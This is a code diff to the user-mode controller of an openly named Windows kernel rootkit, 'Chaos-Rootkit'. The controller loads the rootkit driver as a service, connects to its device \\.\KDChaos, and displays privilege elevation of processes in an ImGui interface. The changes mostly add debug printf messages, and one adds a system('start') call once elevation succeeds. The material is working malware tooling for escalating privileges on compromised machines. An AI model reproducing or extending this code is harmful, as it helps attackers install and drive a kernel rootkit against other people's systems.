@@ -107,7 +107,10 @@ BOOL loadDriver(char* driverPath) {
 
     hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCM == NULL)
+    {
+        printf("cant open SC Manager\n");
         return (1);
+    }
     const char* g_serviceName = "Chaos-Rootkit";
 
     hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);
@@ -118,11 +121,13 @@ BOOL loadDriver(char* driverPath) {
         if (!QueryServiceStatus(hService, &serviceStatus)) {
             CloseServiceHandle(hService);
             CloseServiceHandle(hSCM);
+            printf("Unable to Query Service Status\n");
             return (1);
         }
 
         if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
             if (!StartServiceA(hService, 0, nullptr)) {
+                printf("Unable to Start Service \n");
                 CloseServiceHandle(hService);
                 CloseServiceHandle(hSCM);
                 return (1);
@@ -278,23 +283,31 @@ int main(int, char**)
                     if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) != 0) {}
                     else
                     {
+                        printf(" file not found\n");
+
                         is_rootket_connected = 0;
                     }
                 }
 
                 if (loadDriver(FullDriverPath)) {
                     is_rootket_connected = 0;
+                    printf("Rootkit Not loaded\n");
                 }
 
+                printf(" connected\n");
 
                 hdevice = CreateFile(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
                 if (hdevice == INVALID_HANDLE_VALUE)
                 {
+                    printf(" INVALID_HANDLE_VALUE\n");
+
                     is_rootket_connected = 0;
                 }
                 else
                 {
+                    printf(" Rootkit-Connected\n");
+
                     is_rootket_connected = 1;
                 }
             }
@@ -461,6 +474,7 @@ int main(int, char**)
                     if (!lpBytesReturned)
                     {
                         component_color_handler = 3;
+                        system("start");
                     }
 
                 }
@@ -485,7 +499,7 @@ int main(int, char**)
                 if (component_color_handler == 3)
                 {
 
-                    ImGui::Text("The privilege of process %d has been elevated.");
+                    ImGui::Text("The privilege of process has been elevated.");
 
                 }
                 else 
